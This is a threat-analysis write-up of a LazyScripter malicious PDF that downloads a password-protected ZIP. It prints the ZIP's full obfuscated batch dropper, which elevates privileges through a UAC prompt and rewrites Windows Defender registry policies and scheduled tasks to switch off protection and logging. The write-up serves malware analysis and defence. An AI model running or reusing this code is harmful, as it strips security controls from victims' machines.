## Malicious PDF Document Analysis - Lazyscripter
  ***

# File-information

 LazyScripter is threat group that has mainly targeted the airlines industry since at least 2018, primarily using open-source toolsets [^1] [^2].
 * Md5: **62610680349de97db658a7d41fc9a9b8** available in [**Any Run**](https://app.any.run/tasks/3cb42eba-669a-449f-b275-aa3777f91735/)
 * File Type: PDF



  ![VT](https://user-images.githubusercontent.com/71969773/167416138-7e32fa97-0e43-4c86-b4c8-90b07b184d16.png)
  
# Work-flow
```mermaid
graph TD;
   PDF --> Downloads_ZIP --> BatchScript --> Powershell --> C2;

```
# Analysis
 **Stage1**
 
We can extract PDF properties using *"PDFID"* tool and below snip shows that it has "embedded /URI" content.

![pdfid](https://user-images.githubusercontent.com/71969773/167419962-bc246d73-7b36-4355-95b5-26b16e26f83d.PNG)

With the help of *"pdf-parser"* these URL can be extracted. The downloaded ZIP file is a password protected and it is hardcoded in PDF file. (Password: SSL)

![pdf-parser](https://user-images.githubusercontent.com/71969773/167420978-ff570896-661e-4bc8-9713-36676e13bae2.PNG)
![image](https://user-images.githubusercontent.com/71969773/167421586-ed1091ff-6217-4d63-be9b-43ef427f5181.png)

 **Stage2**
 
 The unzipped file has two batch scripts named as "SecurityDsp.bat & SSLCertificate.bat", both having identical contents with MD5 as "20e9e2e20425f5b89106f6bbace5381d"
 
The code is heavily obfuscated as below.  

<details><summary>Encoded</summary>
<p>

```cmd
@echo off
NET SESSION >nul 2>&1 && goto noUAC
title.
set n=%0 %*
set n=%n:"=" ^& Chr(34) ^& "%
echo Set objShell = CreateObject("Shell.Application")>"%tmp%\cmdUAC.vbs"
echo objShell.ShellExecute "cmd.exe", "/c start " ^& Chr(34) ^& "." ^& Chr(34) ^& " /d " ^& Chr(34) ^& "%CD%" ^& Chr(34) ^& " cmd /c %n%", "", "runas", ^1>>"%tmp%\cmdUAC.vbs"
echo Not Admin, Attempting to elevate...
cscript "%tmp%\cmdUAC.vbs" //Nologo
del "%tmp%\cmdUAC.vbs"
exit /b
:noUAC
  
  @echo off
set wegkoem=a
set bpltpmn=b
set khoziql=c
set tjxpouf=d
set fynwfvh=e
set gfuxihu=f
set dskbaxq=g
set yvyapob=h
set pjdvllg=i
set mnmpqbg=j
set eeuyvwk=k
set mkmhtbo=l
set hxiqvtv=m
set bysdcmi=n
set nutqtmu=o
set brlbmmf=p
set hoahisa=q
set xlnlrpz=r
set ybbwhci=s
set flbzyhx=t
set jxdklrj=u
set cbwqklh=v
set rmyyyjm=w
set lxckycu=x
set tjtkrhi=y
set ikoiset=z

  @%fynwfvh%%khoziql%%yvyapob%%nutqtmu% %nutqtmu%%gfuxihu%%gfuxihu%

%xlnlrpz%%fynwfvh%%dskbaxq% %tjxpouf%%fynwfvh%%mkmhtbo%%fynwfvh%%flbzyhx%%fynwfvh% "%yvyapob%%eeuyvwk%%mkmhtbo%%hxiqvtv%\%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%%rmyyyjm%%wegkoem%%xlnlrpz%%fynwfvh%\%brlbmmf%%nutqtmu%%mkmhtbo%%pjdvllg%%khoziql%%pjdvllg%%fynwfvh%%ybbwhci%\%hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz%" /%gfuxihu%
%xlnlrpz%%fynwfvh%%dskbaxq% %wegkoem%%tjxpouf%%tjxpouf% "%yvyapob%%eeuyvwk%%mkmhtbo%%hxiqvtv%\%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%%rmyyyjm%%wegkoem%%xlnlrpz%%fynwfvh%\%brlbmmf%%nutqtmu%%mkmhtbo%%pjdvllg%%khoziql%%pjdvllg%%fynwfvh%%ybbwhci%\%hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz%" /%cbwqklh% "%tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%wegkoem%%bysdcmi%%flbzyhx%%pjdvllg%%ybbwhci%%brlbmmf%%tjtkrhi%%rmyyyjm%%wegkoem%%xlnlrpz%%fynwfvh%" /%flbzyhx% %xlnlrpz%%fynwfvh%%dskbaxq%_%tjxpouf%%rmyyyjm%%nutqtmu%%xlnlrpz%%tjxpouf% /%tjxpouf% "1" /%gfuxihu%
%xlnlrpz%%fynwfvh%%dskbaxq% %wegkoem%%tjxpouf%%tjxpouf% "%yvyapob%%eeuyvwk%%mkmhtbo%%hxiqvtv%\%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%%rmyyyjm%%wegkoem%%xlnlrpz%%fynwfvh%\%brlbmmf%%nutqtmu%%mkmhtbo%%pjdvllg%%khoziql%%pjdvllg%%fynwfvh%%ybbwhci%\%hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz%" /%cbwqklh% "%tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%wegkoem%%bysdcmi%%flbzyhx%%pjdvllg%%cbwqklh%%pjdvllg%%xlnlrpz%%jxdklrj%%ybbwhci%" /%flbzyhx% %xlnlrpz%%fynwfvh%%dskbaxq%_%tjxpouf%%rmyyyjm%%nutqtmu%%xlnlrpz%%tjxpouf% /%tjxpouf% "1" /%gfuxihu%
%xlnlrpz%%fynwfvh%%dskbaxq% %wegkoem%%tjxpouf%%tjxpouf% "%yvyapob%%eeuyvwk%%mkmhtbo%%hxiqvtv%\%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%%rmyyyjm%%wegkoem%%xlnlrpz%%fynwfvh%\%brlbmmf%%nutqtmu%%mkmhtbo%%pjdvllg%%khoziql%%pjdvllg%%fynwfvh%%ybbwhci%\%hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz%\%hxiqvtv%%brlbmmf%%fynwfvh%%bysdcmi%%dskbaxq%%pjdvllg%%bysdcmi%%fynwfvh%" /%cbwqklh% "%hxiqvtv%%brlbmmf%%fynwfvh%%bysdcmi%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%brlbmmf%%jxdklrj%%ybbwhci%" /%flbzyhx% %xlnlrpz%%fynwfvh%%dskbaxq%_%tjxpouf%%rmyyyjm%%nutqtmu%%xlnlrpz%%tjxpouf% /%tjxpouf% "0" /%gfuxihu%
%xlnlrpz%%fynwfvh%%dskbaxq% %wegkoem%%tjxpouf%%tjxpouf% "%yvyapob%%eeuyvwk%%mkmhtbo%%hxiqvtv%\%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%%rmyyyjm%%wegkoem%%xlnlrpz%%fynwfvh%\%brlbmmf%%nutqtmu%%mkmhtbo%%pjdvllg%%khoziql%%pjdvllg%%fynwfvh%%ybbwhci%\%hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz%\%xlnlrpz%%fynwfvh%%wegkoem%%mkmhtbo%-%flbzyhx%%pjdvllg%%hxiqvtv%%fynwfvh% %brlbmmf%%xlnlrpz%%nutqtmu%%flbzyhx%%fynwfvh%%khoziql%%flbzyhx%%pjdvllg%%nutqtmu%%bysdcmi%" /%cbwqklh% "%tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%bpltpmn%%fynwfvh%%yvyapob%%wegkoem%%cbwqklh%%pjdvllg%%nutqtmu%%xlnlrpz%%hxiqvtv%%nutqtmu%%bysdcmi%%pjdvllg%%flbzyhx%%nutqtmu%%xlnlrpz%%pjdvllg%%bysdcmi%%dskbaxq%" /%flbzyhx% %xlnlrpz%%fynwfvh%%dskbaxq%_%tjxpouf%%rmyyyjm%%nutqtmu%%xlnlrpz%%tjxpouf% /%tjxpouf% "1" /%gfuxihu%
%xlnlrpz%%fynwfvh%%dskbaxq% %wegkoem%%tjxpouf%%tjxpouf% "%yvyapob%%eeuyvwk%%mkmhtbo%%hxiqvtv%\%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%%rmyyyjm%%wegkoem%%xlnlrpz%%fynwfvh%\%brlbmmf%%nutqtmu%%mkmhtbo%%pjdvllg%%khoziql%%pjdvllg%%fynwfvh%%ybbwhci%\%hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz%\%xlnlrpz%%fynwfvh%%wegkoem%%mkmhtbo%-%flbzyhx%%pjdvllg%%hxiqvtv%%fynwfvh% %brlbmmf%%xlnlrpz%%nutqtmu%%flbzyhx%%fynwfvh%%khoziql%%flbzyhx%%pjdvllg%%nutqtmu%%bysdcmi%" /%cbwqklh% "%tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%pjdvllg%%nutqtmu%%wegkoem%%cbwqklh%%brlbmmf%%xlnlrpz%%nutqtmu%%flbzyhx%%fynwfvh%%khoziql%%flbzyhx%%pjdvllg%%nutqtmu%%bysdcmi%" /%flbzyhx% %xlnlrpz%%fynwfvh%%dskbaxq%_%tjxpouf%%rmyyyjm%%nutqtmu%%xlnlrpz%%tjxpouf% /%tjxpouf% "1" /%gfuxihu%
%xlnlrpz%%fynwfvh%%dskbaxq% %wegkoem%%tjxpouf%%tjxpouf% "%yvyapob%%eeuyvwk%%mkmhtbo%%hxiqvtv%\%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%%rmyyyjm%%wegkoem%%xlnlrpz%%fynwfvh%\%brlbmmf%%nutqtmu%%mkmhtbo%%pjdvllg%%khoziql%%pjdvllg%%fynwfvh%%ybbwhci%\%hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz%\%xlnlrpz%%fynwfvh%%wegkoem%%mkmhtbo%-%flbzyhx%%pjdvllg%%hxiqvtv%%fynwfvh% %brlbmmf%%xlnlrpz%%nutqtmu%%flbzyhx%%fynwfvh%%khoziql%%flbzyhx%%pjdvllg%%nutqtmu%%bysdcmi%" /%cbwqklh% "%tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%nutqtmu%%bysdcmi%%wegkoem%%khoziql%%khoziql%%fynwfvh%%ybbwhci%%ybbwhci%%brlbmmf%%xlnlrpz%%nutqtmu%%flbzyhx%%fynwfvh%%khoziql%%flbzyhx%%pjdvllg%%nutqtmu%%bysdcmi%" /%flbzyhx% %xlnlrpz%%fynwfvh%%dskbaxq%_%tjxpouf%%rmyyyjm%%nutqtmu%%xlnlrpz%%tjxpouf% /%tjxpouf% "1" /%gfuxihu%
%xlnlrpz%%fynwfvh%%dskbaxq% %wegkoem%%tjxpouf%%tjxpouf% "%yvyapob%%eeuyvwk%%mkmhtbo%%hxiqvtv%\%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%%rmyyyjm%%wegkoem%%xlnlrpz%%fynwfvh%\%brlbmmf%%nutqtmu%%mkmhtbo%%pjdvllg%%khoziql%%pjdvllg%%fynwfvh%%ybbwhci%\%hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz%\%xlnlrpz%%fynwfvh%%wegkoem%%mkmhtbo%-%flbzyhx%%pjdvllg%%hxiqvtv%%fynwfvh% %brlbmmf%%xlnlrpz%%nutqtmu%%flbzyhx%%fynwfvh%%khoziql%%flbzyhx%%pjdvllg%%nutqtmu%%bysdcmi%" /%cbwqklh% "%tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%xlnlrpz%%fynwfvh%%wegkoem%%mkmhtbo%%flbzyhx%%pjdvllg%%hxiqvtv%%fynwfvh%%hxiqvtv%%nutqtmu%%bysdcmi%%pjdvllg%%flbzyhx%%nutqtmu%%xlnlrpz%%pjdvllg%%bysdcmi%%dskbaxq%" /%flbzyhx% %xlnlrpz%%fynwfvh%%dskbaxq%_%tjxpouf%%rmyyyjm%%nutqtmu%%xlnlrpz%%tjxpouf% /%tjxpouf% "1" /%gfuxihu%
%xlnlrpz%%fynwfvh%%dskbaxq% %wegkoem%%tjxpouf%%tjxpouf% "%yvyapob%%eeuyvwk%%mkmhtbo%%hxiqvtv%\%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%%rmyyyjm%%wegkoem%%xlnlrpz%%fynwfvh%\%brlbmmf%%nutqtmu%%mkmhtbo%%pjdvllg%%khoziql%%pjdvllg%%fynwfvh%%ybbwhci%\%hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz%\%xlnlrpz%%fynwfvh%%wegkoem%%mkmhtbo%-%flbzyhx%%pjdvllg%%hxiqvtv%%fynwfvh% %brlbmmf%%xlnlrpz%%nutqtmu%%flbzyhx%%fynwfvh%%khoziql%%flbzyhx%%pjdvllg%%nutqtmu%%bysdcmi%" /%cbwqklh% "%tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%ybbwhci%%khoziql%%wegkoem%%bysdcmi%%nutqtmu%%bysdcmi%%xlnlrpz%%fynwfvh%%wegkoem%%mkmhtbo%%flbzyhx%%pjdvllg%%hxiqvtv%%fynwfvh%%fynwfvh%%bysdcmi%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%" /%flbzyhx% %xlnlrpz%%fynwfvh%%dskbaxq%_%tjxpouf%%rmyyyjm%%nutqtmu%%xlnlrpz%%tjxpouf% /%tjxpouf% "1" /%gfuxihu%
%xlnlrpz%%fynwfvh%%dskbaxq% %wegkoem%%tjxpouf%%tjxpouf% "%yvyapob%%eeuyvwk%%mkmhtbo%%hxiqvtv%\%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%%rmyyyjm%%wegkoem%%xlnlrpz%%fynwfvh%\%brlbmmf%%nutqtmu%%mkmhtbo%%pjdvllg%%khoziql%%pjdvllg%%fynwfvh%%ybbwhci%\%hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz%\%xlnlrpz%%fynwfvh%%brlbmmf%%nutqtmu%%xlnlrpz%%flbzyhx%%pjdvllg%%bysdcmi%%dskbaxq%" /%cbwqklh% "%tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%fynwfvh%%bysdcmi%%yvyapob%%wegkoem%%bysdcmi%%khoziql%%fynwfvh%%tjxpouf%%bysdcmi%%nutqtmu%%flbzyhx%%pjdvllg%%gfuxihu%%pjdvllg%%khoziql%%wegkoem%%flbzyhx%%pjdvllg%%nutqtmu%%bysdcmi%%ybbwhci%" /%flbzyhx% %xlnlrpz%%fynwfvh%%dskbaxq%_%tjxpouf%%rmyyyjm%%nutqtmu%%xlnlrpz%%tjxpouf% /%tjxpouf% "1" /%gfuxihu%
%xlnlrpz%%fynwfvh%%dskbaxq% %wegkoem%%tjxpouf%%tjxpouf% "%yvyapob%%eeuyvwk%%mkmhtbo%%hxiqvtv%\%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%%rmyyyjm%%wegkoem%%xlnlrpz%%fynwfvh%\%brlbmmf%%nutqtmu%%mkmhtbo%%pjdvllg%%khoziql%%pjdvllg%%fynwfvh%%ybbwhci%\%hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz%\%ybbwhci%%brlbmmf%%tjtkrhi%%bysdcmi%%fynwfvh%%flbzyhx%" /%cbwqklh% "%tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%bpltpmn%%mkmhtbo%%nutqtmu%%khoziql%%eeuyvwk%%wegkoem%%flbzyhx%%gfuxihu%%pjdvllg%%xlnlrpz%%ybbwhci%%flbzyhx%%ybbwhci%%fynwfvh%%fynwfvh%%bysdcmi%" /%flbzyhx% %xlnlrpz%%fynwfvh%%dskbaxq%_%tjxpouf%%rmyyyjm%%nutqtmu%%xlnlrpz%%tjxpouf% /%tjxpouf% "1" /%gfuxihu%
%xlnlrpz%%fynwfvh%%dskbaxq% %wegkoem%%tjxpouf%%tjxpouf% "%yvyapob%%eeuyvwk%%mkmhtbo%%hxiqvtv%\%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%%rmyyyjm%%wegkoem%%xlnlrpz%%fynwfvh%\%brlbmmf%%nutqtmu%%mkmhtbo%%pjdvllg%%khoziql%%pjdvllg%%fynwfvh%%ybbwhci%\%hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz%\%ybbwhci%%brlbmmf%%tjtkrhi%%bysdcmi%%fynwfvh%%flbzyhx%" /%cbwqklh% "%ybbwhci%%brlbmmf%%tjtkrhi%%bysdcmi%%fynwfvh%%flbzyhx%%xlnlrpz%%fynwfvh%%brlbmmf%%nutqtmu%%xlnlrpz%%flbzyhx%%pjdvllg%%bysdcmi%%dskbaxq%" /%flbzyhx% %xlnlrpz%%fynwfvh%%dskbaxq%_%tjxpouf%%rmyyyjm%%nutqtmu%%xlnlrpz%%tjxpouf% /%tjxpouf% "0" /%gfuxihu%
%xlnlrpz%%fynwfvh%%dskbaxq% %wegkoem%%tjxpouf%%tjxpouf% "%yvyapob%%eeuyvwk%%mkmhtbo%%hxiqvtv%\%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%%rmyyyjm%%wegkoem%%xlnlrpz%%fynwfvh%\%brlbmmf%%nutqtmu%%mkmhtbo%%pjdvllg%%khoziql%%pjdvllg%%fynwfvh%%ybbwhci%\%hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz%\%ybbwhci%%brlbmmf%%tjtkrhi%%bysdcmi%%fynwfvh%%flbzyhx%" /%cbwqklh% "%ybbwhci%%jxdklrj%%bpltpmn%%hxiqvtv%%pjdvllg%%flbzyhx%%ybbwhci%%wegkoem%%hxiqvtv%%brlbmmf%%mkmhtbo%%fynwfvh%%ybbwhci%%khoziql%%nutqtmu%%bysdcmi%%ybbwhci%%fynwfvh%%bysdcmi%%flbzyhx%" /%flbzyhx% %xlnlrpz%%fynwfvh%%dskbaxq%_%tjxpouf%%rmyyyjm%%nutqtmu%%xlnlrpz%%tjxpouf% /%tjxpouf% "0" /%gfuxihu%
%xlnlrpz%%fynwfvh%%hxiqvtv% 0 - %tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh% %mkmhtbo%%nutqtmu%%dskbaxq%%dskbaxq%%pjdvllg%%bysdcmi%%dskbaxq%
%xlnlrpz%%fynwfvh%%dskbaxq% %wegkoem%%tjxpouf%%tjxpouf% "%yvyapob%%eeuyvwk%%mkmhtbo%%hxiqvtv%\%ybbwhci%%tjtkrhi%%ybbwhci%%flbzyhx%%fynwfvh%%hxiqvtv%\%khoziql%%jxdklrj%%xlnlrpz%%xlnlrpz%%fynwfvh%%bysdcmi%%flbzyhx%%khoziql%%nutqtmu%%bysdcmi%%flbzyhx%%xlnlrpz%%nutqtmu%%mkmhtbo%%ybbwhci%%fynwfvh%%flbzyhx%\%khoziql%%nutqtmu%%bysdcmi%%flbzyhx%%xlnlrpz%%nutqtmu%%mkmhtbo%\%rmyyyjm%%hxiqvtv%%pjdvllg%\%wegkoem%%jxdklrj%%flbzyhx%%nutqtmu%%mkmhtbo%%nutqtmu%%dskbaxq%%dskbaxq%%fynwfvh%%xlnlrpz%\%tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz%%wegkoem%%brlbmmf%%pjdvllg%%mkmhtbo%%nutqtmu%%dskbaxq%%dskbaxq%%fynwfvh%%xlnlrpz%" /%cbwqklh% "%ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx%" /%flbzyhx% %xlnlrpz%%fynwfvh%%dskbaxq%_%tjxpouf%%rmyyyjm%%nutqtmu%%xlnlrpz%%tjxpouf% /%tjxpouf% "0" /%gfuxihu%
%xlnlrpz%%fynwfvh%%dskbaxq% %wegkoem%%tjxpouf%%tjxpouf% "%yvyapob%%eeuyvwk%%mkmhtbo%%hxiqvtv%\%ybbwhci%%tjtkrhi%%ybbwhci%%flbzyhx%%fynwfvh%%hxiqvtv%\%khoziql%%jxdklrj%%xlnlrpz%%xlnlrpz%%fynwfvh%%bysdcmi%%flbzyhx%%khoziql%%nutqtmu%%bysdcmi%%flbzyhx%%xlnlrpz%%nutqtmu%%mkmhtbo%%ybbwhci%%fynwfvh%%flbzyhx%\%khoziql%%nutqtmu%%bysdcmi%%flbzyhx%%xlnlrpz%%nutqtmu%%mkmhtbo%\%rmyyyjm%%hxiqvtv%%pjdvllg%\%wegkoem%%jxdklrj%%flbzyhx%%nutqtmu%%mkmhtbo%%nutqtmu%%dskbaxq%%dskbaxq%%fynwfvh%%xlnlrpz%\%tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz%%wegkoem%%jxdklrj%%tjxpouf%%pjdvllg%%flbzyhx%%mkmhtbo%%nutqtmu%%dskbaxq%%dskbaxq%%fynwfvh%%xlnlrpz%" /%cbwqklh% "%ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx%" /%flbzyhx% %xlnlrpz%%fynwfvh%%dskbaxq%_%tjxpouf%%rmyyyjm%%nutqtmu%%xlnlrpz%%tjxpouf% /%tjxpouf% "0" /%gfuxihu%
%xlnlrpz%%fynwfvh%%hxiqvtv% %tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh% %rmyyyjm%%tjxpouf% %flbzyhx%%wegkoem%%ybbwhci%%eeuyvwk%%ybbwhci%
%ybbwhci%%khoziql%%yvyapob%%flbzyhx%%wegkoem%%ybbwhci%%eeuyvwk%%ybbwhci% /%khoziql%%yvyapob%%wegkoem%%bysdcmi%%dskbaxq%%fynwfvh% /%flbzyhx%%bysdcmi% "%hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci%\%fynwfvh%%lxckycu%%brlbmmf%%mkmhtbo%%nutqtmu%%pjdvllg%%flbzyhx%%dskbaxq%%jxdklrj%%wegkoem%%xlnlrpz%%tjxpouf%\%fynwfvh%%lxckycu%%brlbmmf%%mkmhtbo%%nutqtmu%%pjdvllg%%flbzyhx%%dskbaxq%%jxdklrj%%wegkoem%%xlnlrpz%%tjxpouf% %hxiqvtv%%tjxpouf%%hxiqvtv% %brlbmmf%%nutqtmu%%mkmhtbo%%pjdvllg%%khoziql%%tjtkrhi% %xlnlrpz%%fynwfvh%%gfuxihu%%xlnlrpz%%fynwfvh%%ybbwhci%%yvyapob%" /%tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%
%ybbwhci%%khoziql%%yvyapob%%flbzyhx%%wegkoem%%ybbwhci%%eeuyvwk%%ybbwhci% /%khoziql%%yvyapob%%wegkoem%%bysdcmi%%dskbaxq%%fynwfvh% /%flbzyhx%%bysdcmi% "%hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz% %khoziql%%wegkoem%%khoziql%%yvyapob%%fynwfvh% %hxiqvtv%%wegkoem%%pjdvllg%%bysdcmi%%flbzyhx%%fynwfvh%%bysdcmi%%wegkoem%%bysdcmi%%khoziql%%fynwfvh%" /%tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%
%ybbwhci%%khoziql%%yvyapob%%flbzyhx%%wegkoem%%ybbwhci%%eeuyvwk%%ybbwhci% /%khoziql%%yvyapob%%wegkoem%%bysdcmi%%dskbaxq%%fynwfvh% /%flbzyhx%%bysdcmi% "%hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz% %khoziql%%mkmhtbo%%fynwfvh%%wegkoem%%bysdcmi%%jxdklrj%%brlbmmf%" /%tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%
